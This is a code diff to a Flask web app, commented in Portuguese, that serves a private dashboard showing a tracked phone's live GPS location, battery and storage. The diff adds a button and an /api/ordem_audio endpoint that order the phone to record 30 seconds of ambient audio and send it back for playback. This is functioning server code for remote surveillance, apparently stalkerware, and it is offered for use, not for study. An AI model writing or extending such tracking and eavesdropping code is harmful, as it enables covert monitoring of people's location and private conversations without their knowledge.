@@ -28,12 +28,14 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .info-box { background: #070f15; border: 1px solid #1e293b; padding: 10px; border-radius: 6px; }
         .info-box span { font-size: 11px; color: #64748b; display: block; text-transform: uppercase; }
         .info-box strong { font-size: 16px; color: #f1f5f9; }
-        .map-container { width: 100%; height: 280px; border-radius: 8px; background: #040a0f; border: 1px solid #1e293b; margin-bottom: 15px; }
+        .map-container { width: 100%; height: 260px; border-radius: 8px; background: #040a0f; border: 1px solid #1e293b; margin-bottom: 15px; }
         .status-tag { background: #166534; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
-        .error-msg { color: #f87171; font-size: 12px; margin-top: 10px; }
         .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; margin-bottom: 15px; }
+        
+        /* BLOCO DE ESCUTA INTELIGENTE */
         .audio-box { background: #070f15; border: 1px solid #1e293b; padding: 15px; border-radius: 8px; text-align: center; }
-        .audio-box span { font-size: 11px; color: #38bdf8; display: block; margin-bottom: 8px; font-weight: bold; letter-spacing: 1px; }
+        .btn-trigger-audio { background: #ea580c; color: #fff; font-weight: bold; border: none; padding: 12px; width: 100%; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; margin-bottom: 12px; }
+        .btn-trigger-audio:disabled { background: #334155; color: #94a3b8; cursor: not-allowed; }
         audio { width: 100%; outline: none; filter: invert(0.9) hue-rotate(180deg); }
     </style>
 </head>
@@ -50,7 +52,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 <button type="submit">Conectar Sinal</button>
             </form>
             {% if erro %}
-                <div class="error-msg">{{ erro }}</div>
+                <div style="color:#f87171; font-size:12px; margin-top:10px;">{{ erro }}</div>
             {% endif %}
         </div>
         
@@ -64,7 +66,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     <div class="info-box"><span>Bateria</span><strong id="txt_bateria" style="color: #22c55e;">{{ info_moto.battery }}%</strong></div>
                     <div class="info-box"><span>Espaço Livre</span><strong id="txt_storage">{{ info_moto.storage }}</strong></div>
                     <div class="info-box"><span>Uptime</span><strong id="txt_uptime">{{ info_moto.uptime }}</strong></div>
-                    <div class="info-box"><span>Sinal GPS</span><strong style="color: #38bdf8;">100% DISPOSITIVO</strong></div>
+                    <div class="info-box"><span>Sinal GPS</span><strong style="color: #38bdf8;">100% ESTÁVEL</strong></div>
                 </div>
                 
                 <div id="map_private" class="map-container"></div>
@@ -74,7 +76,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 </a>
 
                 <div class="audio-box">
-                    <span>🎙️ ESCUTA AMBIENTAL EM TEMPO REAL</span>
+                    <button id="btn_audio" class="btn-trigger-audio" onclick="dispararGravacao()">🎙️ Gravar 30s de Áudio</button>
                     <audio id="audio_player" controls></audio>
                 </div>
             </div>
@@ -82,11 +84,25 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
             <script>
                 let lat = {{ info_moto.lat }};
                 let lon = {{ info_moto.lon }};
-                let lastAudioB64 = "";
+                let currentAudioB64 = "";
                 
                 const map = L.map('map_private', { zoomControl: false }).setView([lat, lon], 16);
                 L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {}).addTo(map);
                 let marker = L.marker([lat, lon]).addTo(map);
+
+                // Função que avisa o servidor que você quer escutar o celular
+                async function dispararGravacao() {
+                    const btn = document.getElementById('btn_audio');
+                    btn.disabled = true;
+                    btn.innerText = "⏳ Enviando Ordem pro Celular...";
+                    
+                    await fetch('/api/ordem_audio/{{ id_buscado }}', { method: 'POST' });
+                    
+                    setTimeout(() => {
+                        btn.innerText = "🎙️ Gravar 30s de Áudio";
+                        btn.disabled = false;
+                    }, 40000); // Trava o botão por 40s enquanto o celular grava e transmite
+                }
 
                 setInterval(async () => {
                     try {
@@ -102,16 +118,15 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                             map.panTo(newPos);
                             document.getElementById('lnk_maps').href = `https://www.google.com/maps/search/?api=1&query=${data.lat},${data.lon}`;
                             
-                            // Toca o formato WAV nativo de forma imediata e fluida
-                            if (data.audio_b64 && data.audio_b64 !== lastAudioB64) {
-                                lastAudioB64 = data.audio_b64;
+                            // Se o celular tiver enviado o áudio solicitado, bota no player
+                            if (data.audio_b64 && data.audio_b64 !== currentAudioB64) {
+                                currentAudioB64 = data.audio_b64;
                                 const player = document.getElementById('audio_player');
                                 player.src = "data:audio/wav;base64," + data.audio_b64;
-                                player.play().catch(e => console.log("Aguardando interacao do usuario"));
                             }
                         }
-                    } catch (e) { console.log("Erro de sincronização"); }
-                }, 4000);
+                    } catch (e) {}
+                }, 5000);
             </script>
         {% endif %}
     </div>
@@ -138,6 +153,14 @@ def api_status(device_id):
         return jsonify(db_dispositivos[device_id]), 200
     return jsonify({"error": "Not found"}), 404
 
+# Dispara a ordem de gravação para o dispositivo solicitado
+@app.route('/api/ordem_audio/<device_id>', methods=['POST'])
+def ordem_audio(device_id):
+    if device_id in db_dispositivos:
+        db_dispositivos[device_id]["comando_gravacao"] = True
+        return jsonify({"status": "ordem_enviada"}), 200
+    return jsonify({"status": "error"}), 404
+
 @app.route('/update', methods=['POST'])
 def update():
     global db_dispositivos
@@ -146,7 +169,7 @@ def update():
     device_id = data['device_id']
     
     if device_id not in db_dispositivos:
-        db_dispositivos[device_id] = {"audio_b64": ""}
+        db_dispositivos[device_id] = {"audio_b64": "", "comando_gravacao": False}
         
     db_dispositivos[device_id]["battery"] = data.get("battery", "N/A")
     db_dispositivos[device_id]["storage"] = data.get("storage", "N/A")
@@ -157,7 +180,12 @@ def update():
     if data.get("audio_b64"):
         db_dispositivos[device_id]["audio_b64"] = data.get("audio_b64")
         
-    return jsonify({"status": "success"}), 200
+    # Retorna para o celular se o site clicou no botão pedindo gravação
+    checar_ordem = db_dispositivos[device_id].get("comando_gravacao", False)
+    if checar_ordem:
+        db_dispositivos[device_id]["comando_gravacao"] = False # Desliga a chave para nao repetir
+        
+    return jsonify({"comando_gravacao": checar_ordem}), 200
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
